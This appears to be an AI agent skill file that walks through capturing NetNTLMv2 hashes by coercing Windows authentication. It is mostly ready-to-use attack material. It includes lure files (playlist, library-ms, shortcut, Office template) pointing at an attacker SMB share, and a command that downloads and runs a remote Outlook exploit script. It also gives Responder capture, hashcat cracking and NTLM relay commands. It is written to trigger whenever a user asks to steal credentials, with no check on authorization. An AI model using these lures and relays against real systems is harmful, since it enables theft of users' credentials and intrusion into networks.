---
name: ntlm-credential-theft
description: Techniques for capturing NetNTLMv2 hashes through Windows authentication coercion. Use this skill whenever the user needs to steal NTLM credentials, capture NetNTLMv2 hashes, perform SMB authentication attacks, exploit writable shares for credential theft, or coerce Windows authentication to an attacker-controlled SMB server. Trigger for any request involving NTLM relay, NetNTLMv2 capture, Windows credential harvesting, SMB lure attacks, or authentication bypass techniques.
---

# NTLM Credential Theft Techniques

This skill provides methods to capture NetNTLMv2 hashes by coercing Windows systems to authenticate to attacker-controlled SMB shares. These hashes can be cracked offline or relayed for lateral movement.

## When to Use This Skill

Use this skill when you need to:
- Capture NetNTLMv2 hashes from Windows systems
- Exploit writable SMB shares for credential theft
- Create authentication lures (SCF, LNK, URL, library-ms files)
- Exploit Windows vulnerabilities for zero-click NTLM leaks
- Coerce authentication through Office documents, Outlook, or Windows Media Player
- Set up Responder or SMB listeners for credential capture

## Prerequisites

- Access to a writable SMB share OR ability to deliver files to targets
- Network position to capture SMB traffic (same subnet or relay capability)
- Responder or impacket-smbserver installed
- Hashcat for offline cracking (optional)

## Core Attack Flow

1. **Generate lures** - Create files that trigger SMB authentication
2. **Deliver lures** - Place on writable shares or send to targets
3. **Capture credentials** - Listen for NetNTLMv2 hashes
4. **Crack or relay** - Use captured hashes for access

---

## Technique 1: Writable SMB Share Lures

**Best for:** When you have write access to a share that users browse in Explorer

### Generate Lure Files

Use the bundled script to create multiple lure types:

```bash
./scripts/generate_ntlm_lures.sh <attacker_ip> <output_dir>
```

This creates SCF, URL, LNK, library-ms, desktop.ini, and Office files pointing to your SMB share.

### Deploy to Writable Share

```bash
smbclient //victim/share -U 'guest%'
cd transfer/
prompt off
mput <lure_files>
```

### Capture Credentials

```bash
# Start Responder listener
sudo responder -I <interface>

# Or use impacket
python3 -m impacket.smbserver share .
```

### Crack Captured Hashes

```bash
hashcat -m 5600 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Note:** Windows Explorer previews files automatically - no clicks required if the victim browses the folder.

---

## Technique 2: Windows Media Player Playlists

**Best for:** When you can get a target to open or preview a WMP playlist

### Create ASX/WAX Playlist

Use the bundled script:

```bash
./scripts/create_wmp_playlist.py <attacker_ip> <output_file.asx>
```

Or manually create:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

### Delivery Methods

- Email the .asx/.wax file
- Place on a website and link to it
- Include in a ZIP with other files

### Capture

```bash
sudo responder -I <interface>
```

---

## Technique 3: ZIP-Embedded .library-ms (CVE-2025-24071/24055)

**Best for:** Zero-click NTLM leak when victim opens ZIP file

### Create .library-ms File

Use the bundled script:

```bash
./scripts/create_library_ms.py <attacker_ip> <output_file.library-ms>
```

Or manually create with this XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<attacker_ip>\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Package and Deliver

```bash
# Zip the file
zip library.zip <file>.library-ms

# Deliver to target
```

### Capture

```bash
sudo responder -I <interface>
```

**Note:** Simply browsing/opening the .library-ms from inside the ZIP triggers the leak - no clicks needed.

---

## Technique 4: Outlook Calendar Reminder (CVE-2023-23397)

**Best for:** Zero-click NTLM leak on unpatched Outlook systems

### Prerequisites

- Access to a host with Outlook installed and configured mailbox
- Target must have Outlook for Windows running when reminder fires

### Execute Attack

Use the bundled PowerShell script:

```bash
./scripts/create_outlook_reminder.ps1 <recipient> <attacker_ip>
```

Or run manually:

```powershell
# Run on a host with Outlook installed
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\<attacker_ip>\\share\\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
```

### Capture

```bash
sudo responder -I eth0
```

**Note:** Patched on March 14, 2023. Still effective on legacy/untouched systems.

---

## Technique 5: .LNK/.URL Icon-Based Zero-Click (CVE-2025-50154)

**Best for:** Bypassing Microsoft's April 2025 patch for UNC-icon shortcuts

### Create .URL File

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\<attacker_ip>\\share\\icon.ico
IconIndex=0
```

### Create .LNK File

Use the bundled script:

```bash
./scripts/create_lnk_lure.py <attacker_ip> <output.lnk>
```

Or via PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\<attacker_ip>\\share\\payload.exe"
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll"  # Local icon bypasses checks
$sc.Save()
```

### Delivery

- Drop in a ZIP file
- Place on writable share
- Combine with other lures in same folder

### Capture

```bash
sudo responder -I <interface>
```

**Note:** Merely viewing the folder triggers authentication - no clicks required.

---

## Technique 6: Office Remote Template Injection

**Best for:** Coercing NTLM when victim opens Office document

### Create Document with Remote Template

Use the bundled script:

```bash
./scripts/create_office_template.py <attacker_ip> <output.docx>
```

### Manual Method

1. Create a .docx file (it's a ZIP archive)
2. Edit `word/settings.xml` - add:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

3. Edit `word/_rels/settings.xml.rels` - add:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\<attacker_ip>\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

4. Repack to .docx and deliver

### Capture

```bash
sudo responder -I <interface>
```

---

## Post-Capture: What to Do with NetNTLMv2 Hashes

### Option 1: Offline Cracking

```bash
# Hashcat autodetects mode 5600 for NetNTLMv2
hashcat -m 5600 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Or with custom wordlist
hashcat -m 5600 hashes.txt /path/to/wordlist.txt
```

### Option 2: NTLM Relay

```bash
# Relay to SMB
npx ntlmrelayx -t smb://<target> -smb2support

# Relay to LDAP
npx ntlmrelayx -t ldap://<target>

# Relay to HTTP
npx ntlmrelayx -t http://<target>
```

### Option 3: Pass-the-Hash (if cracked)

```bash
# Use cracked password for access
# Or use hash directly with tools like Mimikatz
```

---

## Quick Reference: Lure File Types

| File Type | Trigger | Click Required | Notes |
|-----------|---------|----------------|-------|
| SCF | Explorer preview | No | Shell command file |
| LNK | Explorer preview | No | Windows shortcut |
| URL | Explorer preview | No | Internet shortcut |
| library-ms | ZIP open | No | Windows library definition |
| desktop.ini | Folder browse | No | Folder customization |
| .asx/.wax | WMP open | Yes | Media playlist |
| .docx | Document open | Yes | Office template |
| Outlook reminder | Reminder fires | No | Calendar item |

---

## Scripts Available

- `generate_ntlm_lures.sh` - Generate multiple lure file types
- `create_library_ms.py` - Create .library-ms files for ZIP attacks
- `create_wmp_playlist.py` - Create Windows Media Player playlists
- `create_lnk_lure.py` - Create .LNK shortcut lures
- `create_office_template.py` - Create Office documents with remote templates
- `create_outlook_reminder.ps1` - PowerShell for Outlook calendar attacks
- `setup_responder.sh` - Configure Responder listener

---

## References

- [osandamalith - Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
- [Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
- [TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak)
- [windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [CVE-2023-23397 - Outlook EoP](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-elevation-of-privilege-vulnerability-in-microsoft-outlook/)
- [CVE-2025-24071/24055 - ZIP .library-ms](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [CVE-2025-50154 - LNK Icon Bypass](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
